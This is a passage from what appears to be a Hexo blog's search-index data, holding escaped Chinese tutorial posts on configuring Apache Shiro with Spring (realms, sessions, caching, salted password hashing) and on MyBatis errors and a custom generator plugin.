value&#x3D;&quot;&#x2F;manage&#x2F;index&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;unauthorizedUrl&quot; value&#x3D;&quot;&#x2F;login&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;filters&quot;&gt; &lt;map&gt; &lt;entry key&#x3D;&quot;orRoles&quot; value-ref&#x3D;&quot;orLogicalRolesFilter&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D; 此处加载自定义过滤器 &lt;&#x2F;map&gt; &lt;&#x2F;property&gt; &lt;property name&#x3D;&quot;filterChainDefinitions&quot;&gt; &lt;value&gt; &#x2F;user&#x2F;**&#x2F;insert &#x3D; authc, roles[su,admin], perms[write,read] &lt;&#x3D;&#x3D;&#x3D;&#x3D; 此处使用的默认过滤器 &#x2F;user&#x2F;**&#x2F;delete &#x3D; authc, orRoles[su,admin], perms[write,read] &lt;&#x3D;&#x3D;&#x3D;&#x3D; 此处使用了自定义过滤器 &lt;&#x2F;value&gt; &lt;&#x2F;property&gt;&lt;&#x2F;bean&gt;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Shiro","slug":"Shiro","permalink":"http://yoursite.com/tags/Shiro/"}]},{"title":"必ずあなたを守る(四):Shiro的加盐登陆","date":"2016-08-12T19:00:00.000Z","path":"2016/08/13/Shiro的加盐登陆/","text":"对Realm进行加盐操作在文章Realm解析中我们进行了最简单的用户名密码登陆举例，在实际中数据库是不可能存用户的密码明文的(说是这么说，还是有好多作死的公司存)，目的在于: 公司也不能侵犯用户隐私(BAT小米笑而不语) 万一被拖库了，黑客也拿不到用户密码(因为密码被加密了) 什么是加盐操作 username password salt admin xxxxxxxxx sakf3s 在用户表单中除了password字段之外还有salt字段，salt就是英语”盐” salt是在password存入数据库之时随机生成的一个字符串，然后与密码混在一起进行hash操作，将hash值放入password字段当作密码 当用户登陆时 服务器取出salt 与用户的输入进行相同的hash算法 hash值与password进行比较，如果一致就登陆成功 对Realm进行加盐配置随机盐生成器首先一个Object可以生成随机的salt以供使用 123&lt;bean id&#x3D;&quot;secureRandomNumberGenerate&quot; class&#x3D;&quot;org.apache.shiro.crypto.SecureRandomNumberGenerator&quot;&gt; &lt;property name&#x3D;&quot;defaultNextBytesSize&quot; value&#x3D;&quot;5&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; Hash算法对象然后还需要选择某一种Hash算法，以便加盐过程中的Hash运算，其中hashAlgorithmName字符串参考Java本身自带的Hash字符串名 1234&lt;bean id&#x3D;&quot;sha512Matcher&quot; class&#x3D;&quot;org.apache.shiro.authc.credential.HashedCredentialsMatcher&quot;&gt; &lt;property name&#x3D;&quot;hashAlgorithmName&quot; value&#x3D;&quot;SHA-512&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;hashIterations&quot; value&#x3D;&quot;2&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; Salt和Hash注入Realm与文章Realm解析不同，这里authenticationQuery的SQL语句不仅要获得password，还要获得salt 其中saltStyle分为四种 saltStyle salt机制 NO_SALT 默认，密码没有经过加盐 CRYPT 密码是以Unix加密方式储存的 COLUMN salt是单独的一列储存在数据库中 EXTERNAL salt没有储存在数据库中，需要通过JdbcRealm.getSaltForUser(String)函数获取 最常用的方式就是第三个 COLUMN 123456789&lt;bean id&#x3D;&quot;sampleRealm&quot; class&#x3D;&quot;org.apache.shiro.realm.jdbc.JdbcRealm&quot;&gt; &lt;property name&#x3D;&quot;dataSource&quot; ref&#x3D;&quot;dataSource&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;authenticationQuery&quot; value&#x3D;&quot;SELECT password,salt FROM users WHERE username &#x3D; ?&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;userRolesQuery&quot; value&#x3D;&quot;SELECT role FROM roles WHERE username &#x3D; ?&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;permissionsQuery&quot; value&#x3D;&quot;SELECT permission FROM permissisons WHERE username &#x3D; ?&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;permissionsLookupEnabled&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;saltStyle&quot; value&#x3D;&quot;COLUMN&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;声明salt是以column的方式存放在数据库里 &lt;property name&#x3D;&quot;credentialsMatcher&quot; ref&#x3D;&quot;sha512Matcher&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;采用刚才声明的Hash器当作Matcher方法&lt;&#x2F;bean&gt; 需要注意的是，在选择了Slat之后，SQL语句一定要先获得password后获得salt，Realm会按照这个顺序区分哪个字符串是密码，哪个是salt，在JdbcRealm存在默认SQL语句 12protected static final String DEFAULT_AUTHENTICATION_QUERY &#x3D; &quot;select password from users where username &#x3D; ?&quot;;protected static final String DEFAULT_SALTED_AUTHENTICATION_QUERY &#x3D; &quot;select password, password_salt from users where username &#x3D; ?&quot;; 新用户将密码加盐放入数据库由于sampleRealm仅仅是 获得角色和权限的逻辑 ，并不能再新建用户的时候帮我们对用户的密码进行hash，所以在新用户插入数据库的时候，我们要手动进行加盐 123456789101112131415161718192021@Autowiredprivate SecureRandomNumberGenerator secureRandomNumberGenerator;@Autowiredprivate HashedCredentialsMatcher hashedCredentialsMatcher;private void generateNewSaltAndHashedPassword(UserBO userBO) throws Exception &#123; &#x2F;&#x2F;产生随机盐 ByteSource byteSource &#x3D; secureRandomNumberGenerator.nextBytes(); String salt &#x3D; byteSource.toString(); &#x2F;&#x2F;进行Hash运算 String algorithmName &#x3D; hashedCredentialsMatcher.getHashAlgorithmName(); int hashIterations &#x3D; hashedCredentialsMatcher.getHashIterations(); SimpleHash simpleHash &#x3D; new SimpleHash(algorithmName,userBO.getPassword(),salt,hashIterations); String hashedPassword &#x3D; simpleHash.toString(); &#x2F;&#x2F;放入用户模型以便插入数据库 userBO.setSalt(salt); userBO.setPassword(hashedPassword);&#125; 其中 HashedCredentialsMatcher 与 SecureRandomNumberGenerator 我们已经在applicationContext.xml里进行了配置以供sampleRealm使用，这里仅仅需要使用 @Autowired 引用单例即可","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Shiro","slug":"Shiro","permalink":"http://yoursite.com/tags/Shiro/"}]},{"title":"必ずあなたを守る(三):Shiro中Session和Cache","date":"2016-08-12T18:00:00.000Z","path":"2016/08/13/Shiro中Session和Cache/","text":"Session 会话Session是一种状态保持机制，参考文章Session是什么可知Session和Web服务也没有必然关系，Shiro本身的Security Manager也可以脱离Servlet自己管理Session 根据Security Manager不同 Shiro本身有3种Session管理机制 Session Manager 所需Security Manager Session周期 DefaultSessionManager DefaultSecurityManager 使用的默认实现，用于 JavaSE 环境； ServletContainerSessionManager DefaultWebSecurityManager 使用的默认实现，用于 Web 环境，其直接使用 Servlet 容器的会话 DefaultWebSessionManager DefaultWebSecurityManager 用于 Web 环境的实现，可以替代 ServletContainerSessionManager，自己维护着会话，直接废弃了 Servlet 容器的会话管理 可以配置在 securityManager 的 sessionManager 属性中 12345678910&lt;bean id&#x3D;&quot;securityManager&quot; class&#x3D;&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;&gt; &lt;property name&#x3D;&quot;realm&quot; ref&#x3D;&quot;sampleRealm&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;cacheManager&quot; ref&#x3D;&quot;cacheManager&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;进行Cache机制的配置 &lt;property name&#x3D;&quot;sessionManager&quot; ref&#x3D;&quot;sessionManager&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;进行Session机制的配置&lt;&#x2F;bean&gt;&#x2F;&#x2F; 不同的Session机制需要不同的配置属性&lt;bean id&#x3D;&quot;sessionManager&quot; class&#x3D;&quot;org.apache.shiro.web.session.mgt.DefaultWebSessionManager&quot;&gt; .......&lt;&#x2F;bean&gt; Cache 缓存Cache的作用是把每次通过Realm查询到的结果存入Session，以便用户访问时加快Authentication和Authorization 如果要使用cache，必须在 securityManager 和 sessionManager 中同时进行配置 sessionManager的配置在上文的例子中我们使用了最复杂的 org.apache.shiro.web.session.mgt.DefaultWebSessionManager 此处来讲解如何进行具体配置 准备工作首先我们先对sessionManager里会用到的属性进行控制反转，加入Spring，至于为什么需要这些属性，参考文章Session是什么 1234567891011121314151617181920212223&#x2F;&#x2F;shiro自带的EhCache缓存&lt;bean id&#x3D;&quot;cacheManager&quot; class&#x3D;&quot;org.apache.shiro.cache.ehcache.EhCacheManager&quot;&#x2F;&gt;&#x2F;&#x2F;用来产生不重复的sessionId&lt;bean id&#x3D;&quot;sessionGenerate&quot; class&#x3D;&quot;org.apache.shiro.session.mgt.eis.JavaUuidSessionIdGenerator&quot;&#x2F;&gt;&#x2F;&#x2F;session类本身，最主要的存放有sessionId&lt;bean id&#x3D;&quot;sessionDAO&quot; class&#x3D;&quot;org.apache.shiro.session.mgt.eis.EnterpriseCacheSessionDAO&quot;&gt; &lt;property name&#x3D;&quot;sessionIdGenerator&quot; ref&#x3D;&quot;sessionGenerate&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&#x2F;&#x2F;因为放弃了容器的Session机制，所以要自己完成和Web的Cookie交换&lt;bean id&#x3D;&quot;sessionIdCookie&quot; class&#x3D;&quot;org.apache.shiro.web.servlet.SimpleCookie&quot;&gt; &lt;property name&#x3D;&quot;httpOnly&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;maxAge&quot; value&#x3D;&quot;1800000&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;name&quot; value&#x3D;&quot;shiroKey&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&#x2F;&#x2F;对Session进行验证的类&lt;bean id&#x3D;&quot;sessionValidationScheduler&quot; class&#x3D;&quot;org.apache.shiro.session.mgt.ExecutorServiceSessionValidationScheduler&quot;&gt; &lt;property name&#x3D;&quot;interval&quot; value&#x3D;&quot;1800000&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;sessionManager&quot; ref&#x3D;&quot;sessionManager&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 注入sessionManager在准备好了属性之后，对sessionManager进行注入 1234567891011&lt;bean id&#x3D;&quot;sessionManager&quot; class&#x3D;&quot;org.apache.shiro.web.session.mgt.DefaultWebSessionManager&quot;&gt; &lt;property name&#x3D;&quot;sessionDAO&quot; ref&#x3D;&quot;sessionDAO&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;放入具体实例化的Session的Object &lt;property name&#x3D;&quot;sessionValidationScheduler&quot; ref&#x3D;&quot;sessionValidationScheduler&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;采用此类进行Session的验证 &lt;property name&#x3D;&quot;sessionValidationSchedulerEnabled&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;开放Session验证 &lt;property name&#x3D;&quot;sessionIdCookie&quot; ref&#x3D;&quot;sessionIdCookie&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;采用该Cookie机制 &lt;property name&#x3D;&quot;sessionIdCookieEnabled&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;开放Cookie机制 &lt;property name&#x3D;&quot;deleteInvalidSessions&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;删除失效的Session &lt;property name&#x3D;&quot;cacheManager&quot; ref&#x3D;&quot;cacheManager&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;采用自定义缓存 &lt;property name&#x3D;&quot;globalSessionTimeout&quot; value&#x3D;&quot;1800000&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Session多久失效&lt;&#x2F;bean&gt; Shiro配置完毕虽然讲解了自定义的DefaultWebSessionManager但是为了不产生额外的负担推荐使用ServletContainerSessionManager服务器容器自身的Session机制 因为在使用DefaultWebSessionManager产生过一些逻辑意外页面刷新就自动登出了Shiro 此时Shiro虽然已经配置完毕，按照道理应该可以正常使用，但是在实际过程中不会存放明文密码，所以请在阅读了Shiro完成加盐登陆后再进行实战","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Session","slug":"Session","permalink":"http://yoursite.com/tags/Session/"},{"name":"Cookie","slug":"Cookie","permalink":"http://yoursite.com/tags/Cookie/"},{"name":"Shiro","slug":"Shiro","permalink":"http://yoursite.com/tags/Shiro/"}]},{"title":"必ずあなたを守る(二):Shiro中Realm的解析","date":"2016-08-12T17:00:00.000Z","path":"2016/08/13/Shiro中Realm的解析/","text":"RealmRealm作为securityManager的核心，主要解决了一个问题: 从哪里获得Role(角色)和Permission(权限)以供Authentication和Authorization使用 在阅读本文之前首先要了解权限控制的基本概念 : 基于角色的权限控制和基于资源的权限控制(自行百度) 从数据库获得Role和Permission在通常情况下角色和权限存在于数据库，Shiro提供了一个realm类 org.apache.shiro.realm.jdbc.JdbcRealm 供使用 假设存在以下Table users username password salt admin xxxxxxxxx sakf3s roles username role admin su permissions username permission admin write admin read 那么我们可以如此配置JdbcRealm 1234567&lt;bean id&#x3D;&quot;sampleRealm&quot; class&#x3D;&quot;org.apache.shiro.realm.jdbc.JdbcRealm&quot;&gt; &lt;property name&#x3D;&quot;dataSource&quot; ref&#x3D;&quot;dataSource&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;使用哪个数据源链接数据库 &lt;property name&#x3D;&quot;authenticationQuery&quot; value&#x3D;&quot;SELECT password FROM users WHERE username &#x3D; ?&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;获得到密码 &lt;property name&#x3D;&quot;userRolesQuery&quot; value&#x3D;&quot;SELECT role FROM roles WHERE username &#x3D; ?&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;获得到角色 &lt;property name&#x3D;&quot;permissionsQuery&quot; value&#x3D;&quot;SELECT permission FROM permissisons WHERE username &#x3D; ?&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;获得到权限 &lt;property name&#x3D;&quot;permissionsLookupEnabled&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;允许通过查表进行权限查询，默认False，只有设置了True才会执行permissionsQuery&lt;&#x2F;bean&gt; Subject虽然我们配置好了 org.apache.shiro.realm.jdbc.JdbcRealm 有个疑问出现 sampleRealm 如何判断我想使用哪个username登陆呢？ 答案是由 Subject 和 Token 来提供的 Subject是什么Subject 英文直译主题缘由，是指Security Manager处理信息的集合体，在上一章Shiro与Spring集成中我们讲了 Security Manager 的三个主要功能 Authentication: 认证 Authorization: 授权 Realm: 域 这三个逻辑功能都既不会产生信息，也不会保存信息，都是一些逻辑操作，认证和授权比较容易理解，域本身也仅仅是从数据库拿数据的逻辑，并不会储存或者接收数据 这一切的逻辑处理，都是针对Subject进行处理，Subject才带有信息 将Token带入Subject进行登陆与 org.apache.shiro.realm.jdbc.JdbcRealm 配合使用的是Class UsernamePasswordToken 其初始化函数需要 username password 最常用的登陆逻辑 1UsernamePasswordToken usernamePasswordToken &#x3D; new UsernamePasswordToken(userReqVO.getUsername(),userReqVO.getPassword()); 登陆流程到此为止我们已经阐述了太多的概念，到底怎么登陆？？ Web页面进行登陆操作，输入username和password 被 SpringMVC 的 Controller 接收，放入一个Token Token 进入 Subject Subject进行登陆操作去 Security Manager 验证逻辑 Security Manager 验证通过OR不通过 反应到代码上就是 12345678&#x2F;&#x2F; 1. 根据外部数据生成TokenUsernamePasswordToken usernamePasswordToken &#x3D; new UsernamePasswordToken(userReqVO.getUsername(),userReqVO.getPassword());&#x2F;&#x2F; 2. 在代码中通过SecurityUtils单例得到subjectSubject subject &#x3D; SecurityUtils.getSubject();&#x2F;&#x2F; 3. subject进行登陆逻辑验证，逻辑存在于Spring配置文件的 sampleRealm 和 securityManagersubject.login(usernamePasswordToken); 如果登陆失败 subject.login() 会抛出 Exception 权限管理在登陆之后就可以进行权限管理了，因为所有的数据和逻辑结果都存在于subject中，所以说subject本身就提供了一系列的函数 12SecurityUtils.getSubject().checkRole(&quot;admin&quot;); &lt;&#x3D;&#x3D;&#x3D;&#x3D;是否有某个角色SecurityUtils.getSubject().checkPermission(&quot;write&quot;); &lt;&#x3D;&#x3D;&#x3D;&#x3D;是否有某个权限 目前为止配置还不能用到目前为止，Shiro的配置还暂时不能用，因为还有两个不那么重要的问题有待我们处理 Shiro中的Session Shiro中的Cache 将在下章讲解","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Shiro","slug":"Shiro","permalink":"http://yoursite.com/tags/Shiro/"}]},{"title":"必ずあなたを守る(一):Shiro的简介和与Spring集成","date":"2016-08-12T16:00:00.000Z","path":"2016/08/13/Shiro的简介和与Spring集成/","text":"しろShiro的名字是日语 “城” 的发音(拼音谐音 xi luo)，根据Wiki百科是在2004年由 Les Hazlewood and Jeremy Haile 主持编写的，这两个人的名字怎么看都不像日本人，不知道是不是动漫看多了起了这么一个中二的名字。 Shiro的工作机制对于当时还是菜鸡的我 十分复杂 ，况且网上的教程还都过于长篇大论，本系列的目的在于: 针对SpringMVC+Spring框架下Shiro的集成和应用进行 入门讲解 Spring君 一緒だよ根据官方文档与Spring进行集成是十分复杂的的一个操作，需要对Shiro有个细致对了解，这里对集成步骤进行分步讲解 Shiro的核心: Security ManagerShiro的核心是Security Manager对下对接数据库对上对接Web或者Java服务，夹在两层之间，主要有以下几个功能 “()”中是白话解释，不是很准确 Authentication: 认证(用户密码是不是输入对了) Authorization: 授权(看能不能进行操作，类似于看你是VIP会员还是屌丝会员) Realm: 域(此概念是核心中的核心 会有单独讲解 这里只需要记住名字即可) Session: 状态管理，同WebSession概念(需要了解Session是什么，但是如果不了解可以略过) Cache: 缓存(可以暂时略过) 经过分析我们了解到1-3三项其实是Security Manager的主要职责，而 4－5可以暂时忽略 当然如果你有相关知识的储备更好，所以我们可以得出初步的配置文件，将其写入Spring的配置文件 applicationContext.xml 123456789101112&#x2F;&#x2F; 1. 将Shiro的生命周期加入Spring&lt;bean id&#x3D;&quot;lifecycleBeanPostProcessor&quot; class&#x3D;&quot;org.apache.shiro.spring.LifecycleBeanPostProcessor&quot;&#x2F;&gt;&#x2F;&#x2F; 2. 声明Security Manager单例&lt;bean id&#x3D;&quot;securityManager&quot; class&#x3D;&quot;org.apache.shiro.mgt.DefaultSecurityManager&quot;&gt; &lt;&#x3D;&#x3D;&#x3D;这里由多种选择 &lt;property name&#x3D;&quot;realm&quot; ref&#x3D;&quot;myRealm&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;这里是将3中的Realm进行了注入&lt;&#x2F;bean&gt;&#x2F;&#x2F; 3. 将Realm方法加入Spring，该Realm将会被注入Security Manager&lt;bean id&#x3D;&quot;myRealm&quot; class&#x3D;&quot;...&quot;&gt;...&lt;&#x2F;bean&gt; 由于Spring本身只是一个控制反转容器，并不一定提供Web服务，所以使用了 org.apache.shiro.mgt.DefaultSecurityManager 在SpringMVC+Spring的Web服务框架下还有另外一个SecurityManager Security Manager Class名 Spring org.apache.shiro.mgt.DefaultSecurityManager SpringMVC+Spring org.apache.shiro.web.mgt.DefaultWebSecurityManager Security Manager的核心: RealmRealm是Security Manager用来保存主体信息的，所谓主体信息可以狭义的理解成用户名和密码(但是并不准确)，将会在 下一章进行详细讲解如何写配置文件里的 1&lt;bean id&#x3D;&quot;myRealm&quot; class&#x3D;&quot;...&quot;&gt;...&lt;&#x2F;bean&gt; Security Manager如何工作Security Manager有4种工作方式, 且这 四种工作方式可以混合使用 基于代码的单例工作模式 SecurityUtils 基于配置文件的过滤器工作模式 filter 基于注解的工作方式 基于JSP的标签 SecurityUtils的配置在Spring的 applicationContext.xml 中加入如下配置 1234&lt;bean class&#x3D;&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;&gt; &lt;property name&#x3D;&quot;staticMethod&quot; value&#x3D;&quot;org.apache.shiro.SecurityUtils.setSecurityManager&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;arguments&quot; ref&#x3D;&quot;securityManager&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;这里是引用了刚刚配置的securityManager的Bean&lt;&#x2F;bean&gt; 就可以在代码中使用SecurityUtils进行角色和权限的判断， 如果不具有相应的角色和权限，SecurityUtils会抛出Exception 12SecurityUtils.getSubject().checkRole(&quot;admin&quot;);SecurityUtils.getSubject().checkPermission(&quot;write&quot;); filter的配置除了使用代码里进行手动判断，还可以根据servlet的过滤器来实现， web.xml中的配置首先在web.xml文件中加入Shiro的过滤器，并且对所有地址进行过滤 12345678910111213&lt;filter&gt; &lt;filter-name&gt;shiroFilter&lt;&#x2F;filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;&#x2F;filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;targetFilterLifecycle&lt;&#x2F;param-name&gt; &lt;param-value&gt;true&lt;&#x2F;param-value&gt; &lt;&#x2F;init-param&gt;&lt;&#x2F;filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;shiroFilter&lt;&#x2F;filter-name&gt; &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;&lt;&#x2F;filter-mapping&gt; applicationContext.xml中的配置在配置好过滤器之后，可以在Spring的 applicationContext.xml 里配置 123456789101112131415&lt;bean id&#x3D;&quot;shiroFilter&quot; class&#x3D;&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt; &lt;property name&#x3D;&quot;securityManager&quot; ref&#x3D;&quot;securityManager&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D; 引用刚刚声明的securityManager &lt;property name&#x3D;&quot;loginUrl&quot; value&#x3D;&quot;&#x2F;login.jsp&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D; 登录界面(在检测到未登录时会自动跳转至此) &lt;property name&#x3D;&quot;successUrl&quot; value&#x3D;&quot;&#x2F;home.jsp&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D; 登陆成功页面(登陆成功后会自动跳转) &lt;property name&#x3D;&quot;unauthorizedUrl&quot; value&#x3D;&quot;&#x2F;unauthorized.jsp&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D; 检测到访问未授权的页面会自动跳转至此 &lt;property name&#x3D;&quot;filterChainDefinitions&quot;&gt; &lt;value&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;这里可以使用字符串来规定URL需要哪些角色和权限 # some example chain definitions: &#x2F;admin&#x2F;** &#x3D; authc, roles[admin] &#x2F;docs&#x2F;** &#x3D; authc, perms[document:read] &#x2F;** &#x3D; authc &lt;&#x2F;value&gt; &lt;&#x2F;property&gt;&lt;&#x2F;bean&gt; 在value中各种配置字段的意义在官方文档Web-URLPathExpressions有如下说明 过滤器名称 过滤器作用 对应Class anon 允许匿名访问 org.apache.shiro.web.filter.authc.AnonymousFilter authc 需要登陆访问 org.apache.shiro.web.filter.authc.FormAuthenticationFilter authcBasic 咦？不知道和上个啥区别 org.apache.shiro.web.filter.authc.BasicHttpAuthenticationFilter logout 登出 org.apache.shiro.web.filter.authc.LogoutFilter noSessionCreation 访问时不创建Session org.apache.shiro.web.filter.session.NoSessionCreationFilter perms 需要权限 org.apache.shiro.web.filter.authz.PermissionsAuthorizationFilter port 需要端口 org.apache.shiro.web.filter.authz.PortFilter rest 不明 org.apache.shiro.web.filter.authz.HttpMethodPermissionFilter roles 需要角色 org.apache.shiro.web.filter.authz.RolesAuthorizationFilter ssl 需要SSL访问 org.apache.shiro.web.filter.authz.SslFilter user 需要用户 org.apache.shiro.web.filter.authc.UserFilter 注解的配置注解是可以使用 @RequiresPermissions 等注解对方法进行Shiro的权限控制，需要以下配置 1234&lt;bean class&#x3D;&quot;org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator&quot; depends-on&#x3D;&quot;lifecycleBeanPostProcessor&quot;&#x2F;&gt;&lt;bean class&#x3D;&quot;org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor&quot;&gt; &lt;property name&#x3D;&quot;securityManager&quot; ref&#x3D;&quot;securityManager&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 但是这里有一个大坑 : 这两句配置应该加载在哪个配置文件里？ 根据官方文档 Just add these two bean definitions to applicationContext.xml 但是官方文档是指 Spring+Shiro 的情况，在 SpringMVC＋Spring＋Shiro的情况下，如果想在Controller里生效 这两句Bean应该放在SpringMVC的配置文件spring-mvc.xml下 原因见Shiro在SpringMVC+Spring下注解不生效 JSP标签的配置在JSP标签的Shiro配置 1&lt;%@ taglib prefix&#x3D;&quot;shiro&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;shiro.apache.org&#x2F;tags&quot; %&gt; 具体的使用方法，我没有过多的研究，请参考官方文档JSP / GSP Tag Library 讲了这么多配置才刚刚过了一半通过Shiro的前三种工作方式，我们可以发现他们都必须依赖于securityManager的配置，但是securityManager中的realm选项还没进行过配置，下一章我们将详细解释什么是Realm以及如何配置。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Shiro","slug":"Shiro","permalink":"http://yoursite.com/tags/Shiro/"}]},{"title":"MyBatisSpring常见报错:Autowired报错 & Invalid bound","date":"2016-08-12T01:00:00.000Z","path":"2016/08/12/MyBatisSpring常见报错/","text":"Autowired加载Mapper类报错在使用@Autowired加载MyBatis的接口的时候，会报错 1Could not autowire. No beans of &quot;xxxMapper&quot; type found 是因为采用XML当作Mapper接口的实现，所以才会找不到 不用管它，程序能跑 参考MyBatis的核心逻辑 Invalid bound statement (not found)如果碰到以下报错 1Invalid bound statement (not found): com.company.project.dal.mapper.insert 说明MyBatisSpring里Mapper扫描目录配置错了，去搜搜通配符","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"多参数的MyBatisGenerate自定义插件","date":"2016-08-12T01:00:00.000Z","path":"2016/08/12/多参数的MyBatisGenerate自定义插件/","text":"自定义插件根据文章自定义生成SQL的方法我们可以进行更复杂的尝试 目标: updateByKey record: 传入的数据模型 key: 某个数据模型中的参数名的字符串 根据传入的key不同，以不同的参数为参考进行更新 1int updateByKey(UserDO record, String key); 动态SQL语句规划1234567891011121314151617181920212223&lt;update id&#x3D;&quot;updateByKey&quot; &gt; update users &lt;trim prefix&#x3D;&quot;set&quot; suffixOverrides&#x3D;&quot;,&quot; &gt; &lt;if test&#x3D;&quot;param1.id !&#x3D; null and param2 !&#x3D; &#39;id&#39;&quot; &gt; id&#x3D;#&#123;param1.id,jdbcType&#x3D;INTEGER&#125;, &lt;&#x2F;if&gt; &lt;if test&#x3D;&quot;param1.userId !&#x3D; null and param2 !&#x3D; &#39;userId&#39;&quot; &gt; user_id&#x3D;#&#123;param1.username,jdbcType&#x3D;VARCHAR&#125;, &lt;&#x2F;if&gt; &lt;&#x2F;trim&gt; where &lt;choose &gt; &lt;when test&#x3D;&quot;&#39;id&#39; &#x3D;&#x3D; param2&quot; &gt; id&#x3D;#&#123;param1.id,jdbcType&#x3D;INTEGER&#125; &lt;&#x2F;when&gt; &lt;when test&#x3D;&quot;&#39;userId&#39; &#x3D;&#x3D; param2&quot; &gt; user_id&#x3D;#&#123;param1.username,jdbcType&#x3D;VARCHAR&#125; &lt;&#x2F;when&gt; &lt;otherwise &gt; 1&#x3D;0 &lt;&#x2F;otherwise&gt; &lt;&#x2F;choose&gt;&lt;&#x2F;update&gt; 插件代码核心思想是: 拼接XML字符串时可以使用param1代表第一个入参，并且通过param1.id字符串进行参数Getter 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102public class UpdateByKeyPlugin extends PluginAdapter &#123; private final static String METHOD_NAME &#x3D; &quot;updateByKey&quot;; @Override public boolean validate(List&lt;String&gt; warnings) &#123; return true; &#125; @Override public boolean clientGenerated(Interface interfaze, TopLevelClass topLevelClass, IntrospectedTable introspectedTable) &#123; interfaze.addMethod(generateUpdateByKeyMethod(introspectedTable)); return super.clientGenerated(interfaze, topLevelClass, introspectedTable); &#125; @Override public boolean sqlMapDocumentGenerated(Document document, IntrospectedTable introspectedTable) &#123; XmlElement parentElement &#x3D; document.getRootElement(); parentElement.addElement(generateUpdateByKeyMapper(introspectedTable)); return super.sqlMapDocumentGenerated(document, introspectedTable); &#125; private Method generateUpdateByKeyMethod(IntrospectedTable introspectedTable) &#123; &#x2F;&#x2F;方法名 Method targetMethod &#x3D; new Method(METHOD_NAME); &#x2F;&#x2F;生成返回值 参数 FullyQualifiedJavaType returnType &#x3D; FullyQualifiedJavaType.getIntInstance(); FullyQualifiedJavaType parameterTypeFirst &#x3D; new FullyQualifiedJavaType(introspectedTable.getBaseRecordType()); FullyQualifiedJavaType parameterTypeSecond &#x3D; FullyQualifiedJavaType.getStringInstance(); &#x2F;&#x2F;设置方法 targetMethod.setVisibility(JavaVisibility.PUBLIC); targetMethod.setReturnType(returnType); targetMethod.addParameter(new Parameter(parameterTypeFirst,&quot;record&quot;)); targetMethod.addParameter(new Parameter(parameterTypeSecond,&quot;key&quot;)); 